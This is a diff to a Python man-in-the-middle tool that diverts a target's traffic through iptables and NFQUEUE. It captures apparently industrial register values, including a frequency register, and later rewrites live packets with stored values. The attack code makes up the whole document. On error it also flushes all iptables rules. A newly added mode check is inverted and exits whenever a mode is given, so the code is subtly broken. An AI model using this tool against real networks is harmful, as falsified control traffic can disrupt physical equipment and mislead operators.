@@ -7,8 +7,41 @@ change_values = []
 debugging = False
 
 def get_values():
-    
+    global read
+    global change_values
+    with open(read, 'r') as f:
+        for line in f:
+            change_values.append(int(line.strip()))
+    print(f"[*] Values read from {read}")
     return change_values
+
+def store_values(output):
+    with open(output, 'w') as f:
+        for value in change_values:
+            f.write(f"{value}\n")
+    print(f"[*] Values stored in {output}")
+
+def capture_traffic(scapy_packet):
+    global change_values
+    global debugging
+    try:
+        packet = IP(scapy_packet.get_payload())
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load
+            data = payload[9:]
+
+            first_register = int.from_bytes(data[0:2], byteorder="big")
+            if first_register == 101 and len(payload) > 100:
+                hz_register = int.from_bytes(data[32:34], byteorder="big")
+                
+                change_values.append(hz_register)
+        scapy_packet.accept()
+    except Exception as e:
+        print(f"CRITICAL ERROR: {e}")
+        traceback.print_exc()
+        scapy_packet.drop() 
+        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")
+
 
 def modify_packet(scapy_packet):
     global change_values
@@ -29,7 +62,7 @@ def modify_packet(scapy_packet):
                 if len(change_values) == 0: get_values()
                 change_value=change_values.pop(0)
                 
-                change_value = int(change_value*10000)
+                change_value = int(change_value)
                 
                 #debug        
                 if debugging: print("Change Value:", change_value)
@@ -97,21 +130,33 @@ if __name__ == "__main__":
     ip = args.target
     port=args.port
     debugging = args.debug
+    
     store=args.store
     output=args.output
+    
     attack=args.attack
     read=args.read
+    
+    if attack or store:
+        print(f'[*] Mode must be specified')
+        sys.exit(1)
+    
+    if attack and store:
+        print("[*] Attack mode and store mode can not be used together")
+        sys.exit(1)
 
-    if (attack or output) and (store or read):
+    if (attack or read) and (store or output):
         print("[*] Output file and store/read mode can not be used together")
         sys.exit(1)
-        
+
+
     try:
         setup_iptables(ip,port)
         print(f"[*] IPTables rules set on {ip}:{port}")
         nfqueue = NetfilterQueue()
         print("[*] Creating NFQUEUE")
-        nfqueue.bind(1, modify_packet)
+        if attack: nfqueue.bind(1, modify_packet)
+        if store: nfqueue.bind(1, capture_traffic)
         print("[*] Starting NFQUEUE")
         print("[*] Waiting for packets")
         nfqueue.run() 
@@ -123,6 +168,7 @@ if __name__ == "__main__":
         if nfqueue:
             nfqueue.unbind()
             print("[*] Stopped NFQUEUE")
+        if store: store_values(output)
         cleanup_iptables(ip,port)
         print("[*] IPTables rules removed")
         sys.exit(0)
